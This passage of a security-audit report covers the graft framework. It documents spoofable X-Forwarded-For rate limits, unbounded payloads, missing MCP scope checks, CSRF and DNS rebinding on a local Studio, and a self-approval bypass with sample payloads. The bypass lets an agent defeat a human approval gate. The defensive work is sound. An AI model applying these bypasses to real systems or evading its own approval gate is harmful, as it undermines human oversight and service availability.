**Recommendation:** Pin all four actions to full commit SHAs. Consider splitting into two jobs: a version job with contents/pull-requests write (no id-token) and a publish job with only id-token: write.

---

### Public submitContact accepts unbounded payloads and its rate limit is bypassable via spoofed X-Forwarded-For

- **File:** `examples/docs-site/graft.config.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 103, 107, 111, 113
- **Slug:** rate-limit-bypass
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified end-to-end in examples/docs-site/graft.config.ts: submitContact is kind:'mutation', public:true, rateLimit {5/60s}, input: submissions.fields where email/message are field.string()/field.text(). packages/core/src/field.ts proves FieldOptions carries ONLY optional/description — BASE_ZOD builds bare z.string() with no max() anywhere, and defineFunction's handler pipeline adds no length clamping, so insertRecord writes ctx.input verbatim into the unbounded jsonb data column of data_records; Next.js App Router route handlers impose no default body-size cap. The rate-limit leg is equally real: anonymous identity is clientIp()'s leftmost XFF entry (see F2 analysis of functions-handler.ts), so in any append-style-proxy or direct deployment an attacker rotates the header to get unlimited fresh buckets. Combined attack is concrete: unauthenticated requests with multi-megabyte message fields at effectively unlimited rate produce unthrottled paid DB-write amplification and storage exhaustion. The scanner-note about 'weak cipher' lines being false positives is consistent with the file (those are prose strings). MEDIUM is right: denial-of-storage impact, no privilege escalation. The payload-cap and rate-key fixes belong in field.ts/core respectively, confirming this config-level finding as a fair co-location of both gaps.

`submitContact` (L103-116) is an anonymous-callable mutation whose declared control is a 5/min-per-caller rate limit. Two compounding weaknesses make this control ineffective: (1) `input: submissions.fields` (L111) validates email/message with bare `z.string()` — the field builders in packages/core/src/field.ts offer no maxLength option — so a single request can carry a multi-megabyte `message` that is inserted verbatim into Postgres jsonb via insertRecord (L113). (2) The rate identity for anonymous callers comes from `clientIp()` in packages/core/src/functions-handler.ts, which trusts the FIRST entry of the client-supplied `X-Forwarded-For` header. In any deployment where the proxy appends rather than replaces XFF (typical self-host/Node setups), an attacker rotates the header per request to get a fresh rate bucket. Combined: unauthenticated, effectively unthrottled DB write amplification against data_records, leading to storage exhaustion/outage. All scanner-flagged 'weak cipher' lines in this file are false positives (they are description strings; no crypto exists here).

**Recommendation:** Add length caps to field.string()/field.text() (or clamp in the handler) and validate email format; fix the rate identity in createFunctionsHandler to use the last trusted proxy hop (or platform-provided IP like Vercel's `x-real-ip` set by the edge) instead of the attacker-controlled first XFF entry.

---

### Anonymous rate limiting keyed to spoofable X-Forwarded-For value; concurrent requests outrun the counter

- **File:** `examples/docs-site/src/pages/api/fn/[name].ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 39, 40
- **Slug:** rate-limit-bypass
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Both mechanisms verified in packages/core/src/functions-handler.ts, from which this route builds its handler with no overrides (and FunctionsHandlerOptions offers no trusted-proxy knob to override with). clientIp() returns forwarded.split(",")[0] — the FIRST x-forwarded-for hop, which is client-controlled whenever the edge proxy appends (Vercel-style behavior) and used verbatim when no proxy exists; the anonymous rateKey is ip:<that value>, and docs-site graft.config.ts defines submitContact as public:true with a 5/60s limit. Attack: rotate X-Forwarded-For per request and each request gets a fresh rate identity, permitting unbounded anonymous inserts into the shared Postgres submissions table (storage exhaustion, PII-slot pollution, audit noise). The race claim also verifies: the limiter is a plain SELECT COUNT over audit_log rows (createDbAuditStore.countSince), while record() executes only after invoke() completes, so N concurrent requests all read the same count before any row lands, bursting past the configured limit. One imprecision: the cited lines 39-40 are actually the db factory (the operative bits are the handler construction at L44 and the core-handler clientIp/count logic), but the substance of the finding is accurate. MEDIUM fits — bypass of a public-form abuse control, not direct data exposure.

Same chain as the landing page: the createFunctionsHandler instance constructed here derives the anonymous rate key from clientIp() (first x-forwarded-for entry — client-controlled when proxies append), so submitContact's 5/60s public-mutation limit can be evaded by rotating that header, flooding the shared Postgres with submission rows. The audit-row count check also races: concurrent invocations read the same count before any of them record, permitting bursts above the configured limit.

**Recommendation:** Prefer the last XFF hop or platform-injected client IP for rate identity, expose a trusted-proxy-count knob on createFunctionsHandler, and move the limit check to an atomic increment.

---

### Content tools have no scope/role gating once authenticated; decide_approval trusts a caller-supplied operator identity

- **File:** `examples/docs-site/src/pages/api/mcp.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 33, 34
- **Slug:** acl-check
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Both halves verified. (a) Missing authorization: packages/mcp/src/server.ts applies zero scope or role checks to write_content, put_asset, list_approvals, and decide_approval — scopes are consulted only inside run_function access rules via createFunctionsHandler — so docs-site's mcp.ts (actor: resolveActor wired at the flagged line) grants every authenticated actor full content-admin authority regardless of granted scopes; today the only credential is the owner GRAFT_DEV_TOKEN (resolveActor has issuers: [], so any other bearer gets TOKEN_INVALID 401), which makes the escalation latent-but-by-construction: adding any issuer instantly promotes narrow-scope tokens to content admins. (b) decide_approval forwards the client-supplied `decidedBy` label into decideApproval(), whose anti-self-approval WHERE clause compares that attacker-chosen string against the stored requestedById — trivially satisfied by naming anyone else — and this half is exploitable right now, including anonymously via the fail-open mount. This is a distinct vulnerability class (broken authorization/SoD) from F4's missing authentication at the same file, so not a duplicate; cross-file kinship with F1 (same flaw in server.ts) does not make it a duplicate under the rules. Medium fits: real seam defect, partial current exploitability.

With auth required, every authenticated actor — regardless of scopes — can exercise write_content, put_asset, list_approvals and decide_approval (packages/mcp/src/server.ts applies no scope checks to these tools; requireScopes is only used by function access rules). The docs site currently has no issuer configured, so this mostly matters post-integration, but the seam is unsafe by construction: adding any issuer (as the landing page does) instantly makes every valid token a content-admin credential. Separately, decide_approval forwards an attacker-chosen `decidedBy` label into decideApproval(), whose anti-self-approval WHERE clause (requestedById != decidedBy) is trivially satisfied by naming someone else — undermining the separation-of-duties control at the application layer.

**Recommendation:** Add scope-based access rules to MCP content/approval tools via the existing actor seam, and stamp decisions with the verified actor id (rejecting client-supplied identities).

---

### Anonymous rate limiting keyed to spoofable X-Forwarded-For value; concurrent requests outrun the counter

- **File:** `examples/landing-page/app/api/fn/[name]/route.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 44, 47
- **Slug:** rate-limit-bypass
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** The route builds its handler with rateLimit {limit:60,windowSeconds:60} and delegates all rate identity to @usegraft/core's clientIp(), which I verified takes x-forwarded-for.split(',')[0] — the leftmost, client-supplied entry under standard XFF append semantics — and falls back to blindly trusting x-real-ip. Nothing in this route, the examples (no middleware.ts exists), or the core library validates the value or counts trusted hops. Concretely: self-hosted behind nginx/HAProxy with proxy_add_x_forwarded_for (or hit directly, where the header is 100% attacker-chosen), each request bearing a unique XFF mints a fresh 'ip:<value>' bucket, defeating both submitContact's 5/min cap and the handler-wide backstop; each admitted call inserts a paid data_records row. The concurrency half is also accurate: countSince is a plain SELECT COUNT (packages/db/src/audit.ts) executed before fn.handler runs, while the current attempt's audit row is only written after the response is built, so N concurrent requests all observe used<limit. Severity MEDIUM is right — it defeats a spam/backstop control, not authentication.

The handler built here delegates anonymous rate identity to clientIp() (packages/core/src/functions-handler.ts), which returns x-forwarded-for.split(",")[0] — the FIRST, i.e. client-controlled, entry wherever the edge appends rather than replaces the header (self-host behind nginx/HAProxy with proxy_add_x_forwarded_for, various PaaS). An attacker rotates X-Forwarded-For per request to mint fresh `ip:<value>` keys, bypassing submitContact's 5/min cap and the 60/min handler-wide backstop, enabling unthrottled spam inserts into the submissions table (each insert is a paid DB write). Independently, the limiter is count-then-execute-then-record against audit_log rows with no transaction/lock, so N concurrent requests all observe the same count and execute before any row lands — a burst exceeding the limit even without header spoofing.

**Recommendation:** Use the right-most untrusted-hop IP (last entry) or the platform-provided connection IP (e.g. Vercel's x-real-ip / x-vercel-forwarded-for) as the rate key, make the trust depth configurable per deployment, and consider an atomic counter (upsert-with-increment) or per-key token bucket to close the concurrency window.

---

### Authenticated low-privilege users get unrestricted content-admin powers over MCP; approval separation-of-duties uses a caller-supplied identity

- **File:** `examples/landing-page/app/api/mcp/route.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 33, 36
- **Slug:** acl-check
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Both claims verified against source. lib/auth.ts enables emailAndPassword sign-in and its jwt definePayload stamps EVERY self-registered account's token with scope "submissions:read commerce:orders:read commerce:orders:write" (minted at GET /api/auth/token); with GRAFT_MCP_REQUIRE_AUTH=1 such a user passes http.ts's requireActor check (kind 'human', not anonymous) and can then invoke write_content, put_asset, list_approvals, and decide_approval, none of which consult scopes anywhere in packages/mcp/src/server.ts — a genuine privilege escalation from scoped reader/writer to unrestricted content admin, asset uploader, and approval decider that defeats the app's own scope policy. Second claim: the route forwards the caller-chosen decidedBy into decideApproval(), whose separation-of-duties predicate (requestedById IS NULL OR requestedById != decidedBy) is satisfied by naming a different label, voiding the application-layer control and leaving only the optional Postgres role split — which this single-DATABASE_URL example does not deploy — as backstop. Distinct vulnerability class (authorization/SoD) from F6's authentication gap at the same file, hence not a duplicate; relation to F1 is cross-file similarity, which does not count. MEDIUM is appropriate.

Even with GRAFT_MCP_REQUIRE_AUTH=1, the MCP content tools (write_content, put_asset, list_approvals, decide_approval in packages/mcp/src/server.ts) perform no scope or role checks whatsoever — scopes are only consulted inside run_function access rules. Meanwhile lib/auth.ts hands EVERY self-registered account (email/password sign-in is enabled) a JWT scoped 'submissions:read commerce:orders:read commerce:orders:write'. Any site user can therefore mint a token at GET /api/auth/token and gain full content-authoring, asset-upload, and approval-decision authority — a privilege escalation from 'authenticated reader' to 'content admin' that defeats the app's own scope policy. Compounding this, the decide_approval tool passes a caller-chosen `decidedBy` string into decideApproval(), whose separation-of-duties WHERE clause compares requestedById != decidedBy — an agent that requested an approval under id 'agent-A' can approve its own request by supplying decidedBy='mcp-operator', voiding the requester-cannot-decide control (only the optional Postgres role split remains as a backstop).

**Recommendation:** Gate MCP tools behind requireScopes-style rules (e.g. content:write for write_content/put_asset, approvals:decide for decide_approval) using the same actor resolver already wired in. Derive decidedBy from the verified actor identity server-side instead of accepting a client-supplied stamp.

---

### listComments applies limit before filtering, letting anyone silently hide approved comments

- **File:** `examples/landing-page/graft/comments.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 53, 60, 62, 63, 66
- **Slug:** other-content-suppression
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified end-to-end. listComments (examples/landing-page/graft/comments.ts L62) calls listRecords, which in packages/core/src/records.ts selects WHERE branch_id=? AND collection='comments' ORDER BY created_at DESC LIMIT n — no predicate on approved or pageSlug. Only after the cap does the handler filter in JS (L66). postComment is public:true accepting arbitrary pageSlug strings, so an anonymous caller can mint unlimited unapproved rows (5/min per rate bucket, and the bucket key is the attacker-controlled first XFF entry per clientIp() in functions-handler.ts, or simply ~20 minutes of patience at 5/min). Once ≥100 newer rows exist, approved comments on every page silently vanish from listings (single collection-wide window), with no error. Data isn't destroyed, so suppression-not-deletion is accurate; MEDIUM holds. Concrete attack: POST 100 postComments with rotated X-Forwarded-For values, then GET listComments for any slug returns empty.

The listComments handler (L62-66) fetches the newest N rows across ALL comments on every page slug — including unapproved spam held for moderation — and only THEN filters with `.filter((r) => r.data.approved && r.data.pageSlug === ctx.input.pageSlug)`. Because `postComment` (L33-50) is a public mutation accepting arbitrary pageSlugs, an attacker can fill the default 100-row scan window with unapproved comments (5/min legitimately, faster if the XFF-keyed rate identity is rotated — see rate-limit-bypass finding). Once >=100 newer rows exist than an approved comment, that comment permanently disappears from every listing without any error or indication. This is unauthenticated suppression/de-facto deletion of moderator-approved content. Note the row cap spans all pages, so spam on one slug suppresses comments on every other slug.

**Recommendation:** Push the predicate into SQL: filter by `approved = true AND pageSlug = ?` inside the listRecords WHERE clause (extend listRecords to accept a where condition) and apply LIMIT after filtering.

---

### Anonymous caller can force a full-table scan / unbounded response via crafted listComments limit

- **File:** `examples/landing-page/graft/comments.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 58, 60, 63
- **Slug:** other-unbounded-query-limit
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Confirmed: limit is field.number() → bare ZodNumber (optional), flowing straight into Drizzle .limit(ctx.input.limit ?? 100) with no clamp anywhere in records.ts. A huge positive value (e.g. 1e9) makes the public, anonymous-reachable query fetch every comments row on the branch into Node memory and Zod-revalidate each (parseStoredRow), with megabyte bodies storable via postComment (no app middleware/body caps; data column is unbounded jsonb) — a genuine single-request CPU/memory amplification vector. The only backstop is the handler-wide 60/min limit wired in app/api/fn/[name]/route.ts, keyed on the spoofable first-XFF entry. One correction to the finding: PostgreSQL rejects negative LIMIT ('LIMIT must not be negative'), so limit:-1 yields a FUNCTION_EXECUTION_FAILED 500, not a full scan — but the finding's primary mechanism (attacker-chosen large scan size) is fully valid, so true-positive stands.

`limit` is `field.number` (bare `z.number()`: any finite value accepted, negatives included) and flows unvalidated into Drizzle's `.limit(ctx.input.limit ?? 100)` (packages/core/src/records.ts). PostgreSQL treats a negative LIMIT as "no limit" and huge positive values as unlimited scans, so `POST /api/fn/listComments {"pageSlug":"x","limit":-1}` makes the anonymous caller fetch every comment row on the branch into memory, re-validate each with Zod, then serialize them — a cheap single-request resource-exhaustion vector on a fully public endpoint that also has no per-function rateLimit (only the 60/min handler-wide backstop, itself XFF-bypassable). Confidentiality impact is nil (the approved-only filter still runs in memory), so this is availability/resource abuse rather than disclosure.

**Recommendation:** Validate the bound server-side: clamp to a sane maximum (e.g. z.number().int().min(1).max(500)) or ignore non-positive/oversized values in the handler before calling listRecords; add a modest per-function rateLimit.

---

### postComment stores unbounded author/body strings behind a header-spoofable rate limit

- **File:** `examples/landing-page/graft/comments.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 33, 37, 43, 44, 47
- **Slug:** rate-limit-bypass
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified: author/body compile to bare z.string() (field.ts BASE_ZOD), insertRecord performs schema-validate-then-insert with no truncation, and data_records.data is unbounded jsonb (packages/db/src/schema.ts L107). The sole throttle is rateLimit {5/min} whose anonymous identity is clientIp()'s FIRST x-forwarded-for entry (functions-handler.ts L115-118) — attacker-controlled whenever a proxy appends (standard behavior) or when the app is exposed directly, so header rotation yields fresh buckets and effectively unlimited inserts of arbitrarily large rows. Next.js App Router route handlers impose no default body-size limit and no middleware exists in the example. Moderation integrity is indeed sound (approved forced false at L47). Exploitation depends somewhat on proxy topology, but the code-level weakness is real; MEDIUM is appropriate.

The public mutation postComment (L33-50) is protected solely by `rateLimit: { limit: 5, windowSeconds: 60 }` (L37), which createFunctionsHandler counts against a rate key derived from the first entry of the client-controlled `X-Forwarded-For` header for anonymous actors (packages/core/src/functions-handler.ts `clientIp()`). An anonymous attacker rotating that header obtains unlimited invocations, and since `author` (L43) and `body` (L44) compile to bare `z.string()`/`z.text()` with no maximum length, each call can persist megabyte-scale rows into the shared data_records table (insertRecord performs no truncation). Beyond storage exhaustion, this accelerates the scan-window pollution attack on listComments described separately. Moderation itself is sound: approved is forced to false server-side (L47).

**Recommendation:** Bound author (e.g. 100 chars) and body (e.g. 5-10k chars) via new maxLength support in field builders or explicit handler checks; fix anonymous rate identity to use the trustworthy remote address (last hop added by your own proxy / platform header).

---

### Public placeOrder: unbounded items array drives sequential per-item DB queries; email unbounded; rate limit keyed on spoofable header

- **File:** `examples/landing-page/graft/commerce.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 127, 131, 136, 137, 93, 99, 204
- **Slug:** rate-limit-bypass
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** All three amplifiers confirmed in source. items compiles to plain z.array() with no max (only length===0 rejected at the top of the handler); loadProducts loops over unique slugs issuing one awaited ctx.db.query.contentIndex.findFirst per slug — and crucially this happens BEFORE unknown-slug rejection, so a payload of tens of thousands of distinct bogus slugs forces tens of thousands of serial round-trips while holding a pooled connection before the handler errors with INPUT_VALIDATION_FAILED; email is bare z.string() persisted verbatim into jsonb. placeOrder is public:true, anonymous-callable, and its 10/min limit is keyed on the spoofable first-XFF entry (clientIp(), confirmed by the package's own test). A few concurrent crafted requests exhaust the shared db pool and stall unrelated functions. Pricing integrity is correctly noted as sound (server-side lookup). Concrete attack fully describable; MEDIUM fits.

placeOrder (L127-217) is anonymous-callable with `rateLimit: { limit: 10, windowSeconds: 60 }` (L131), but the anonymous rate key is the first entry of the client-supplied `X-Forwarded-For` header (packages/core/src/functions-handler.ts `clientIp()`), so it is bypassable by header rotation. Three amplifiers then apply per request: (1) `items` is `z.array(...)` with no maximum element count (L137-145); (2) loadProducts (L93-124) issues one sequential `findFirst` round-trip per unique slug with no batching, so a request containing tens of thousands of distinct productSlug strings ties up a DB connection for that many serial queries before responding; (3) `email` (L136) has no length/format cap, so each surviving request persists attacker-sized rows via insertRecord (L204). Net: unauthenticated connection-pool exhaustion and storage bloat. Pricing integrity itself is solid — unit prices are looked up server-side from content_index (L196-201), never taken from client input.

**Recommendation:** Cap items length (e.g. <= 50) in Zod/handler; batch the catalog lookup into a single IN(...) query; bound email length and format; fix the anonymous rate identity to use a trustworthy source IP.

---

### Open registration plus blanket scope grant exposes contact-form PII and lets any user rewrite order statuses

- **File:** `examples/landing-page/lib/auth.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 21, 33
- **Slug:** acl-check
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Every link in the chain checks out in source. lib/auth.ts L21 enables email+password auth, which turns on Better Auth's unauthenticated POST /api/auth/sign-up/email through the public catch-all mount (app/api/auth/[...all]/route.ts exports auth.handler for GET+POST); grep confirms no disableSignUp, no email-verification requirement, and no Next.js middleware anywhere in the example. L33 stamps EVERY account's JWT with 'submissions:read commerce:orders:read commerce:orders:write'; lib/actor.ts trusts this issuer via betterAuthIssuer, packages/auth/src/oidc.ts readScopes() parses the space-separated scope claim into actor.scopes, and packages/auth/src/scopes.ts requireScopes() admits any non-anonymous actor holding the scope. Concrete attack: sign up free, GET /api/auth/token with the session cookie, then Bearer-call listSubmissions/searchSubmissions (dump all submitter emails + message bodies), listOrders (all customer order data), and updateOrderStatus — which is NOT destructive:true, so under the default approvalPolicy 'none' createFunctionsHandler applies no human gate, allowing arbitrary paid/fulfilled/cancelled transitions without payment. The in-code 'example-sized policy' comments show awareness, and the known-false-positive exemption covers only GRAFT_DEV_TOKEN bootstrap (not this policy), so the finding stands: the example is deployable as-is and copies inherit the over-grant. MEDIUM fits given PII disclosure plus e-commerce state corruption scoped to example deployments.

lib/auth.ts configures Better Auth with `emailAndPassword: { enabled: true }` (L21), which enables unauthenticated self-registration via POST /api/auth/sign-up/email through the public catch-all mount in app/api/auth/[...all]/route.ts, with no email-verification requirement. Simultaneously, the JWT definePayload hook (L29-L34) stamps EVERY newly registered account with the scope claim "submissions:read commerce:orders:read commerce:orders:write" (L33). Because packages/auth/src/scopes.ts requireScopes() accepts any actor whose token carries the scope, an attacker needs zero privileges beyond one free signup to: (1) mint a JWT at GET /api/auth/token, (2) call listSubmissions/searchSubmissions and dump all contact-form submissions including submitter email addresses and message bodies (PII disclosure), (3) call listOrders and read all customer order data (emails, items, totals), and (4) call updateOrderStatus to set arbitrary orders to paid/fulfilled/cancelled — corrupting e-commerce state without payment. Verified end-to-end: the scope claim flows through oidc.readScopes() into actor.scopes, and createFunctionsHandler enforces exactly these gates. The code comments acknowledge this is an 'example-sized policy' (real deployments derive scopes from roles), which lowers confidence that it is unintended, but the example is deployable as-is and copies of it inherit the flaw. Note the more dangerous scopes (submissions:admin, content:moderate) are correctly reserved for the dev token only.

**Recommendation:** Derive scopes from a role/group claim instead of granting them to every authenticated principal (e.g., check user.role === 'admin' inside definePayload and emit an empty scope otherwise), require email verification before minting scoped tokens, and/or disable open signup (disableSignUp) so accounts are provisioned by an operator.

---

### Approval decision attribution (decidedBy) is client-controlled, defeating the APPROVAL_SELF_DECISION separation-of-duties guard

- **File:** `packages/cli/src/commands/serve.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 290
- **Slug:** other-audit-tampering
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified in packages/studio/src/api.ts decideMatch handler: const row = await decideApproval(options.db, id, payload.decision, payload.decidedBy?.trim() || operator(options)) — the request body overrides the mount-time identity ('studio-serve' at serve.ts L290). decideApproval's separation-of-duties is purely the string comparison ne(approvals.requestedById, decidedBy) inside the UPDATE WHERE (approvals.ts). Any caller of the decide endpoint who knows the requester id (it is returned by GET /approvals, list_approvals, and the DESTRUCTIVE_OP_REQUIRES_APPROVAL response) supplies any other string and passes; when requestedById is NULL (anonymous filer) the or(isNull(...)) arm makes it pass regardless. Effect: APPROVAL_SELF_DECISION — described in code and docs as holding 'against the agent itself' — is a no-op on this surface, and the audit trail's decided_by is fully attacker-chosen; only decided_role (= current_user, stamped server-side in the same UPDATE) is trustworthy. This is a distinct root cause from F2 (authorization to reach the endpoint vs. integrity of attribution/separation-of-duties), so not a duplicate. MEDIUM fits: it needs a caller who already passed authorize (or loopback access).

graft serve mounts the Studio API with decidedBy: "studio-serve" (L290), implying decision attribution is authoritative. But the decide endpoint reads decidedBy from the request body: payload.decidedBy?.trim() || operator(options) (packages/studio/src/api.ts, decideMatch handler). decideApproval's separation-of-duties WHERE clause compares requestedById !== decidedBy (packages/db/src/approvals.ts), so whoever requested an approval can self-approve simply by supplying any other string (e.g. {"decision":"approved","decidedBy":"human-reviewer"}). This turns APPROVAL_SELF_DECISION — advertised as a guard that 'holds against the agent itself' — into a no-op for any caller of the Studio/MCP decide endpoints, and lets attackers forge who approved destructive operations in the audit trail. Only decided_role (= Postgres current_user) is trustworthy; decidedBy is fully attacker-chosen on this surface.

**Recommendation:** Derive decidedBy from the authenticated actor resolved by the authorize callback (reject requests that attempt to override it), never from the request body. If a display name is needed, store it separately from the identity used for the separation-of-duties comparison.

---

### Loopback Studio mounts authorize=undefined with no Origin/CSRF/Host validation — drive-by webpages can approve destructive ops and edit content

- **File:** `packages/cli/src/commands/serve.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 282, 283, 292
- **Slug:** other-csrf-dns-rebinding
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified: on loopback the serve.ts ternary yields authorize === undefined (L282-283), and createStudioApiHandler only authenticates `if (options.authorize)` — so every Studio mutation is unauthenticated locally. Repo-wide grep confirms no Origin/Sec-Fetch-Site/Host/CSRF handling anywhere in server code (only Vite dev-proxy config and UI-side code), and createNodeListener builds the Request solely from method/headers/body with no validation. Every mutation uses request.json(), which parses the body regardless of Content-Type, so a webpage's no-cors cross-site POST (JSON serialized as text/plain) executes side effects: decisions, PUT /document file writes, commits, revert, compile — opaque responses don't matter. DNS rebinding additionally defeats SOP for reads (content tree, raw documents, pending approval inputs incl. ids needed for targeted CSRF), and Host-header-based routing has no allowlist to stop it. Browser mitigations (Chrome Local Network Access) are incomplete across browsers and don't cover co-resident processes; this remains the classic unprotected-localhost-admin class. Medium confidence is fair given dependence on browser environment, but the missing controls are objectively present. True positive at MEDIUM.

On loopback binds the Studio authorize callback is undefined (L282-283), which the Studio API treats as 'no authentication required', and the Node adapter (createNodeListener) performs no Origin, Sec-Fetch-Site, or Host validation anywhere. Every Studio mutation is a plain stateless POST/PUT that parses JSON bodies regardless of Content-Type, so a malicious webpage visited by the developer can send no-cors cross-site POSTs to http://127.0.0.1:<port>/api/studio/v1/... and successfully drive approve/deny decisions, PUT /document (writes arbitrary frontmatter/body into content files), /changes/commit, /compilations/:id/revert, and /compile — responses are unreadable but side effects execute. DNS rebinding additionally grants full read access (content tree, raw documents, pending approval inputs). This converts a browser drive-by into remote execution of the operator's most privileged actions, including defeating the human gate while a destructive-op approval is pending review.

**Recommendation:** Validate Host against the configured bind host and reject mismatches (defeats DNS rebinding), reject requests whose Origin/Referer is cross-origin, or require a token even on loopback for mutating endpoints (e.g. echo a per-process secret the SPA injects as a header). At minimum, gate approval-decision endpoints behind authentication even when bound to loopback.

---

### Backstop rate limit keyed on spoofable X-Forwarded-For header

- **File:** `packages/cli/src/commands/serve.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 212, 213
- **Slug:** rate-limit-bypass
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified in packages/core/src/functions-handler.ts: clientIp() returns forwarded.split(',')[0].trim() from X-Forwarded-For (falling back to X-Real-IP) with no trusted-proxy configuration, and the rate key for anonymous callers is `ip:${ip}`. startServe mounts this as the handler-wide 60 req/min backstop (serve.ts L212-213), and graft serve's primary topology is direct exposure of the Node listener with no proxy stripping headers. An unauthenticated attacker rotates X-Forwarded-For per request to get a fresh bucket each time, nullifying both the backstop and any per-function limits on public functions. Concrete impact: unlimited hammering of expensive functions and unbounded filing of approval rows plus audit rows (each gated call inserts into approvals/audit_log before any human looks) — a persistent-noise/DoS vector against the very tables the human gate depends on. Not mitigated anywhere else (no proxy-count option, no socket-address plumbing through createNodeListener). MEDIUM is appropriate for an abuse-control bypass rather than direct compromise.

startServe wires a handler-wide rate limit of 60 req/min (L213) as the abuse backstop. The rate identity for anonymous callers comes from clientIp() in packages/core/src/functions-handler.ts, which blindly trusts the first value of X-Forwarded-For (falling back to X-Real-IP). When graft serve is exposed directly (its primary self-host topology, no reverse proxy stripping the header), an unauthenticated attacker rotates X-Forwarded-For values to get unlimited fresh rate buckets, nullifying the backstop for expensive/public functions and approval-request flooding (each gated call inserts an approval row).

**Recommendation:** Only honor forwarded headers when the request came through a trusted proxy (configure a trusted-proxy flag / proxy count), otherwise key on the socket remote address. Surface the real peer address through createNodeListener so handlers don't depend on headers.

---

### Attacker-controlled Host header is trusted when synthesizing the request URL; Studio shell 302 reflects it in Location

- **File:** `packages/cli/src/commands/serve.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 95, 101
- **Slug:** other-open-redirect
- **Confidence:** low
- **Revalidation:** uncertain
- **Reasoning:** The code behavior is confirmed: createNodeListener synthesizes new Request(`http://${req.headers.host}${req.url}`) with no Host allowlist (serve.ts ~L95-101), and createStudioHandler's trailing-slash/branch-pinning redirect runs BEFORE authorization (authorize is only consulted inside the API for /api/studio/v1), reflecting the Host into Response.redirect(url.toString(), 302) Location. So Host: evil.com against /studio yields Location: http://evil.com/studio/?branch=main — genuine host-header reflection on an unauthenticated route. What I cannot establish from source is victim delivery: browsers always send the true Host, so the only standalone effect reflects back to the attacker; meaningful impact requires an intermediary that caches 302s keyed by path while forwarding attacker-controlled Host (a stacking of external misconfigurations the audited code neither provides nor controls), and under DNS rebinding the redirect adds nothing since the rebound Host is already attacker-owned. The routing-confusion side claim is weak too (routing uses pathname, which Host doesn't influence; absolute-form request lines just produce an invalid URL and a 500). Real defect worth fixing (host allowlist / no-store), but concrete exploitable harm is deployment-dependent and cannot be confirmed statically — hence uncertain rather than a confident true/false positive.

createNodeListener builds the internal Request URL from the raw Host header: http://${req.headers.host}${req.url} (L101). Downstream, createStudioHandler derives absolute URLs from this for its trailing-slash/branch-pinning redirect (Response.redirect(url.toString(), 302) in packages/studio/src/handler.ts) — and that redirect runs BEFORE the authorize callback (only /api/studio/* routes pass through authorize), so on any deployment with --studio mounted, an unauthenticated request with Host: evil.com and path /studio (or / for graft studio) receives 302 Location: http://evil.com/studio/?branch=main. Behind a caching proxy or CDN that caches 302s keyed by path this enables redirect-cache poisoning; combined with DNS rebinding it smooths the local attack described elsewhere. Routing itself also parses the attacker-influenced URL, allowing path-prefix confusion between router branches.

**Recommendation:** Validate the Host header against the configured bind host (reject unknown hosts with 400), or construct redirect targets from server configuration rather than the request's Host header, and mark the 302 non-cacheable (Cache-Control: no-store).

---

### Local Studio runs with authorize=undefined and no Origin/Host validation — any local process or drive-by webpage can decide approvals and rewrite content

- **File:** `packages/cli/src/commands/studio.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 65, 66, 74, 75, 80, 81, 90
- **Slug:** other-csrf-dns-rebinding
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified independently of F5 at studio.ts: loopback (the default host 127.0.0.1, port 4983) leaves authorize undefined (L74-81), which createStudioApiHandler treats as unauthenticated; the surface includes POST /api/studio/v1/approvals/:id/decide (decideApproval), PUT /api/studio/v1/document (writeDocument writes attacker-controlled frontmatter/body into MDX sources and recompiles), /changes/commit (git commit), and /compilations/:id/revert. createNodeListener is imported from ./serve and performs no Origin/Host/Sec-Fetch validation; JSON bodies parse regardless of Content-Type, so no-cors cross-site POSTs execute side effects, and DNS rebinding grants full read access including pending approval inputs. A co-resident malicious process (e.g., npm lifecycle script) needs no browser at all to hit 127.0.0.1:4983 and silently approve pending destructive ops or rewrite content. Same vulnerability class as F5 but a different command/mount/file, so per the rules it is not a duplicate — it stands on its own. MEDIUM with medium confidence matches the browser-dependent exploit prerequisites.

